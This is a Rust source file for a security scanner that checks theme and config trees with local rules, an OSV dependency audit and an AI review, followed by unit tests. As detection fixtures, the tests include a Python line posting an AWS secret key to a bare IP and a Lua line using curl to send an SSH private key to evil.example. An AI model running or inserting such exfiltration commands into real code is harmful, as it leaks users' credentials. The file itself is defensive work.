//! The review pipeline shared by every command: local rules, dependency
//! audit, then the OpenCode review.

use crate::agent::{self, SourceFile};
use crate::deps;
use crate::osv;
use crate::report::{Gap, LocalFinding, NetworkRequest, Report};
use crate::rules::{self, RuleId, Scheme};
use crate::scan::{self, FileKind, ScanConfig, TextFile};
use crate::tools::OpenCode;

pub const MAX_AGENT_INPUT_SIZE: usize = 256 * 1024;
const EXCERPT_CHARS: usize = 180;
const LFS_POINTER: &str = "version https://git-lfs.github.com/spec/v1";

/// Reviews a file or directory tree.
pub fn review_tree(config: &ScanConfig, opencode: &OpenCode) -> Report {
    let mut report = Report::new(config.root.display().to_string());

    let (snapshot, walk_gaps) = scan::walk(config, &mut |file: TextFile<'_>| {
        analyze_text(&mut report, file.rel, file.text, true);
    });
    report.snapshot = snapshot;
    report.gaps.extend(walk_gaps);
    if report.text_files_reviewed == 0 {
        report.gaps.push(Gap::NoReviewableFiles);
    }

    audit_dependencies(&mut report);
    run_agent(&mut report, opencode);
    report
}

/// Applies the local checks to one text file and queues it for the AI review.
pub fn analyze_text(report: &mut Report, rel: &str, text: &str, inspect_dependencies: bool) {
    report.text_files_reviewed += 1;

    if text.lines().next() == Some(LFS_POINTER) {
        report.gaps.push(Gap::UnresolvedLfs(rel.to_string()));
    }
    queue_for_agent(report, rel, text);

    let documentation = rules::is_documentation(rel);
    let inventory_network = rules::is_executable_or_runtime_config(rel);
    for (index, line) in text.lines().enumerate() {
        let number = index + 1;
        if inventory_network {
            record_network(report, rel, number, line);
        }
        if !documentation {
            let lowered = line.to_lowercase();
            for rule in rules::line_rules(&lowered) {
                push_finding(report, rel, number, line, rule);
            }
        }
    }

    if inspect_dependencies {
        deps::inspect(&mut report.dependencies, &mut report.gaps, rel, text);
    }
}

fn queue_for_agent(report: &mut Report, rel: &str, text: &str) {
    if rules::is_sensitive_path(rel) {
        report.gaps.push(Gap::SensitiveWithheld(rel.to_string()));
        return;
    }

    let size = rel.len() + text.len();
    if report.agent_input_size + size > MAX_AGENT_INPUT_SIZE {
        if !report.agent_input_overflowed {
            report.agent_input_overflowed = true;
            report.gaps.push(Gap::AgentInputTooLarge);
        }
        return;
    }
    report.agent_input_size += size;
    report.agent_input.push(SourceFile {
        path: rel.to_string(),
        content: text.to_string(),
    });
}

fn record_network(report: &mut Report, rel: &str, number: usize, line: &str) {
    for (scheme, host) in rules::extract_network_destinations(line) {
        if !rules::is_local_host(&host) {
            if scheme == Scheme::Http {
                push_finding(report, rel, number, line, RuleId::CleartextNetworkRequest);
            }
            if rules::is_ip_host(&host) {
                push_finding(report, rel, number, line, RuleId::DirectIpNetworkRequest);
            }
        }
        report.network.push(NetworkRequest {
            path: rel.to_string(),
            line: number,
            scheme,
            host,
        });
    }
}

fn push_finding(report: &mut Report, rel: &str, number: usize, line: &str, rule: RuleId) {
    report.findings.push(LocalFinding {
        path: rel.to_string(),
        line: number,
        rule,
        excerpt: line.trim().chars().take(EXCERPT_CHARS).collect(),
    });
}

fn audit_dependencies(report: &mut Report) {
    deps::check_coverage(&report.dependencies, &mut report.gaps);
    let packages = report.dependencies.packages();
    if packages.is_empty() {
        return;
    }
    match osv::audit(packages) {
        Ok(audit) => report.audit = Some(audit),
        Err(error) => report.gaps.push(Gap::Dependency(format!(
            "OSV dependency audit failed: {error}"
        ))),
    }
}

/// Runs the AI review when there is complete input to give it; an oversized
/// tree is already incomplete, so it is not sent to the provider at all.
pub fn run_agent(report: &mut Report, opencode: &OpenCode) {
    let has_oversized = report.snapshot.count(FileKind::OversizedText) > 0;
    if report.agent_input.is_empty() || report.agent_input_overflowed || has_oversized {
        return;
    }

    let result = opencode
        .resolve()
        .and_then(|binary| agent::review(&binary, &report.agent_input));
    match result {
        Ok(review) => report.agent = Some(review),
        Err(error) => report.gaps.push(Gap::Agent(error)),
    }
}

#[cfg(test)]
mod tests {
    use std::fs;
    use std::path::PathBuf;

    use super::{analyze_text, review_tree};
    use crate::agent::Status;
    use crate::report::{Gap, Report, Verdict};
    use crate::rules::RuleId;
    use crate::scan::ScanConfig;
    use crate::test_support::{TempDir, mock_opencode};
    use crate::tools::OpenCode;

    fn unavailable() -> OpenCode {
        OpenCode::At(PathBuf::from("/nonexistent/opencode"))
    }

    fn rules_in(report: &Report) -> Vec<RuleId> {
        report.findings.iter().map(|finding| finding.rule).collect()
    }

    #[test]
    fn reports_cleartext_ip_and_credential_exfiltration() {
        let mut report = Report::default();
        analyze_text(
            &mut report,
            "src/send.py",
            "requests.post('http://198.51.100.8/upload', data=os.environ['AWS_SECRET_ACCESS_KEY'])\n",
            true,
        );

        assert_eq!(report.network.len(), 1);
        assert_eq!(report.network[0].host, "198.51.100.8");
        let rules = rules_in(&report);
        assert!(rules.contains(&RuleId::CredentialExfiltration));
        assert!(rules.contains(&RuleId::CleartextNetworkRequest));
        assert!(rules.contains(&RuleId::DirectIpNetworkRequest));

        let mut tls = Report::default();
        analyze_text(
            &mut tls,
            "client.py",
            "requests.get('https://api.example.test', verify=False)\n",
            true,
        );
        assert_eq!(rules_in(&tls), [RuleId::DisabledTlsVerification]);
    }

    #[test]
    fn documentation_is_reviewed_by_the_agent_but_not_the_local_rules() {
        let mut report = Report::default();
        analyze_text(
            &mut report,
            "README.md",
            "Install with `sudo pacman -S foo` and add it to ~/.bashrc.\n",
            true,
        );
        assert!(report.findings.is_empty());
        assert_eq!(report.agent_input.len(), 1);
    }

    #[test]
    fn sensitive_files_are_withheld_and_incomplete() {
        let mut report = Report::default();
        analyze_text(&mut report, ".env", "TOKEN=x\n", true);
        assert!(report.agent_input.is_empty());
        assert!(matches!(
            report.gaps.as_slice(),
            [Gap::SensitiveWithheld(_)]
        ));
    }

    #[test]
    fn agent_input_is_bounded() {
        let mut report = Report::default();
        let chunk = "a".repeat(200 * 1024);
        analyze_text(&mut report, "one.txt", &chunk, false);
        analyze_text(&mut report, "two.txt", &chunk, false);
        analyze_text(&mut report, "three.txt", &chunk, false);

        assert_eq!(report.agent_input.len(), 1);
        assert!(report.agent_input_overflowed);
        assert_eq!(
            report
                .gaps
                .iter()
                .filter(|gap| matches!(gap, Gap::AgentInputTooLarge))
                .count(),
            1
        );
    }

    #[test]
    fn unresolved_git_lfs_pointer_makes_the_scan_incomplete() {
        let dir = TempDir::new("lfs");
        fs::write(
            dir.path().join("theme-background.png"),
            "version https://git-lfs.github.com/spec/v1\noid sha256:deadbeef\nsize 12345\n",
        )
        .unwrap();

        let report = review_tree(&ScanConfig::new(dir.path()), &unavailable());
        assert_eq!(report.verdict(), Verdict::Incomplete);
        assert!(
            report
                .gaps
                .iter()
                .any(|gap| matches!(gap, Gap::UnresolvedLfs(_)))
        );
    }

    #[test]
    fn malicious_theme_is_flagged_and_a_failed_agent_is_incomplete() {
        let dir = TempDir::new("theme");
        fs::write(dir.path().join("colors.toml"), "background = '#000000'\n").unwrap();
        fs::write(
            dir.path().join("hyprland.lua"),
            "os.execute(\"curl -X POST -d @~/.ssh/id_ed25519 https://evil.example\")\n",
        )
        .unwrap();

        let report = review_tree(&ScanConfig::new(dir.path()), &unavailable());
        let rules = rules_in(&report);
        assert!(rules.contains(&RuleId::ShellCommandExecution));
        assert!(rules.contains(&RuleId::CredentialFileAccess));
        assert!(rules.contains(&RuleId::CredentialExfiltration));
        assert!(report.gaps.iter().any(|gap| matches!(gap, Gap::Agent(_))));
        assert_eq!(report.verdict(), Verdict::Incomplete);
    }

    #[test]
    fn a_clean_tree_with_a_clear_agent_review_is_clear() {
        let dir = TempDir::new("clean");
        let bin = TempDir::new("clean-bin");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();

        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
        let report = review_tree(&ScanConfig::new(dir.path()), &opencode);
        assert!(report.gaps.is_empty(), "{:?}", report.gaps);
        assert_eq!(
            report.agent.as_ref().map(|review| review.status),
            Some(Status::Clear)
        );
        assert_eq!(report.verdict(), Verdict::Clear);
    }

    #[test]
    fn a_tree_under_a_secrets_directory_is_not_withheld() {
        let parent = TempDir::new("outer");
        let dir = parent.path().join("secrets").join("project");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("main.lua"), "print('hi')\n").unwrap();

        let report = review_tree(&ScanConfig::new(&dir), &unavailable());
        assert!(
            !report
                .gaps
                .iter()
                .any(|gap| matches!(gap, Gap::SensitiveWithheld(_)))
        );
        assert_eq!(report.agent_input.len(), 1);
    }
}
